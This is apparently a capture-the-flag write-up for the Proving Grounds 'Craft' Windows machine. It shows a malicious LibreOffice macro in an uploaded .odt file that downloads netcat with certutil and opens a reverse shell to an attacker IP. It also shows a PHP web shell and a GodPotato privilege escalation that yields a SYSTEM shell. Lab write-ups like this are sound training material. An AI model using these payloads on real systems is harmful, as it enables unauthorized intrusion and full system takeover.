# Craft

## Enumeration & scanning

- `Nmap` didn't work, seems like server is blocking `icmp` requests. Scan without these.
- We find webapp hosted on port 80.
- Webapp has file upload functionality for resumes in `.odt` file format and it says these will be checked.
- We find `/uploads` folder that seems to show any uploaded files.

``` sh
# Default scanning
sudo nmap -p- 192.168.246.169 -Pn
sudo nmap -p 80 -A 192.168.198.169 -Pn
nuclei -target http://192.168.246.169  
feroxbuster -u http://192.168.198.169/ 
```

## Exploitation

- When we upload a file, it appears in the `/uploads` folder and is removed some time later. It seems like it is processed.
- We likely need to upload a file with a macro. Follow this [guide](https://dominicbreuker.com/post/htb_re/).
- Get reverse shell and local flag.

``` vb
# Testing macro
REM  *****  BASIC  *****

Sub Main
	shell("ping -n 1 192.168.45.235")
End Sub

# Reverse shell
REM  *****  BASIC  *****

Sub Main
	Shell("certutil.exe -urlcache -split -f 'http://192.168.45.235/nc.exe' 'C:\Windows\Temp\nc.exe'")
    Shell("C:\Windows\Temp\nc.exe -e cmd 192.168.45.235 81")
End Sub
```

``` ps1
# Get local flag
C:\Users\thecybergeek\Desktop>type local.txt
type local.txt
90268099e15faba94c8b706d12027834
```

## Privilege Escalation

- Used WinPEAS but no obvious contenders. Looked into services and vulnerabilities.
- Folder `C:\xampp\htdocs` is writable, meaning we can upload a webshell and get to `apache` user.
- Using webshell, we find that `apache` user has `SeImpersonatePrivilege` enabled.
- Use `GodPotato` to exploit this and get root flag.

``` ps1
# Download shell to Apache folder
iwr -uri http://192.168.45.235/simple_php_web_shell_post.php -Outfile shell.php
# Check privs
whoami /priv

# Check .NET version
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
# Download GodPotato
certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
# Test GodPotato
.\GodPotato-NET4.exe -cmd "whoami"
# Get netcat for reverse shell
certutil -urlcache -split -f http://192.168.45.235/nc.exe
.\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"
# Get root flag
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
ec4a7d6845655e1cad5ae604382cbfa6

```

## References

- https://dominicbreuker.com/post/htb_re/
- https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc


## Rabbit holes

- Metasploit macro builder didn't work, not clear why.
- Resume service was running under local user and had no privilege escalation path.
- Windows Server 2019 seems old but is not typical for vulnerability exploit.
